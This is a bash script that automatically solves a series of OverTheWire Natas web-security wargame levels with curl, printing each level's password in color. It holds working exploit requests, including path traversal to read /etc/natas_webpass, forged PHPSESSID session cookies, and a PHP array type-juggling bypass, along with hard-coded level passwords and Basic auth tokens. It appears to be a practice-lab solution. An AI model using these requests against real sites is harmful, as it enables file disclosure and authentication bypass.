#!/bin/bash 
##"Colores en Bash"
underline=$(tput sgr 0 1)
bold=$(tput bold)
rojo=$(tput setaf 1)
azul=$(tput setaf 4)
blanco=$(tput setaf 7)
verde=$(tput setaf 2)
morado=$(tput setaf 5)
amarillo=$(tput setaf 3)
reset=$(tput sgr0)

echo -e "$bold$blando Username: \t $verde Password $reset"
url=http://natas0.natas.labs.overthewire.org 
user=natas0
password=natas0 
password2=$(curl -s $url -u $user:$password  | grep -n  "^<\!" | grep "^16" | awk '{print $6}')
echo -e "$bold$amarillo natas1: \t $rojo$password2 $reset"
url2=http://natas1.natas.labs.overthewire.org/ 
password3=$(curl -s $url2 -u natas1:$password2 | grep -n "^<\!" | grep "^17"  | awk '{print $6}')
echo -e "$bold$amarillo natas2: \t $rojo $password3 $reset"
password4=$(curl -s -u natas2:$password3 'http://natas2.natas.labs.overthewire.org/files/users.txt'  | grep natas3 | awk -F':' '{print $2}')
echo -e "$bold$amarillo natas3: \t $rojo $password4 $reset"
password5=$(curl -s -u natas3:$password4 'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'  | awk -F':' '{print $2}')
echo -e "$bold$amarillo natas4: \t $rojo $password5 $reset" 
token=$(curl -s -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 "http://natas6.natas.labs.overthewire.org/includes/secret.inc"   | grep -e '".*"' | awk  '{print $3}' | sed 's/[";]//g') 
password7=$(curl -s -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 "http://natas6.natas.labs.overthewire.org/" -X POST --data-raw 'secret='$token'&submit=Enviar+consulta'  | grep natas7 | awk '{print $8}')
echo -e "$bold$amarillo natas7: \t $rojo $password7 $reset"
password8=$(curl -s -u natas7:$password7 'http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8' | grep "DB")
echo -e "$bold$amarillo natas8: \t $rojo $password8 $reset" 
echo -e "$bold$amarillo natas13: \t $rojo jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY $reset"
echo -e "$bold$amarillo natas14: \t $rojo Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 $reset"
password19=$(curl -s  'http://natas18.natas.labs.overthewire.org/index.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' -H 'Connection: keep-alive' -H 'Referer: http://natas18.natas.labs.overthewire.org/' -H 'Cookie: PHPSESSID=119' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin&password=admin'  | html2text | grep Password | awk '{print $2}')
echo -e "$bold$amarillo natas19: \t $rojo $password19 $reset" 
password20=$(curl  -s 'http://natas19.natas.labs.overthewire.org/index.php' -X POST -d 'username=admin&password=admin'  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw== ' -H 'Connection: keep-alive'  -H 'Cookie: PHPSESSID=3238312d61646d696e' -H 'Upgrade-Insecure-Requests: 1' | html2text | grep Password | awk '{print $2}')
echo -e "$bold$amarillo natas20: \t $rojo $password20 $reset" 
password23=$(curl -s -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ 'http://natas22.natas.labs.overthewire.org/?revelio' | html2text | grep Password | awk '{print $2}')
echo -e "$bold$amarillo natas23: \t $rojo $password23 $reset" 
password24=$(curl -s -u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE 'http://natas23.natas.labs.overthewire.org/?passwd=111iloveyou7' | html2text  | grep Username | awk '{print $4}')
echo -e "$bold$amarillo natas24: \t $rojo $password24 $reset" 
password25=$(curl -s  'http://natas24.natas.labs.overthewire.org/?passwd[]=0' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0'  -H 'Authorization: Basic bmF0YXMyNDpPc1JtWEZndW96S3BUWlo1WDE0ek5PNDMzNzlMWnZlZw=='  -H 'Upgrade-Insecure-Requests: 1'  | html2text | grep natas25 | awk '{print $4}')
echo -e "$bold$amarillo natas25: \t $rojo $password25 $reset" 

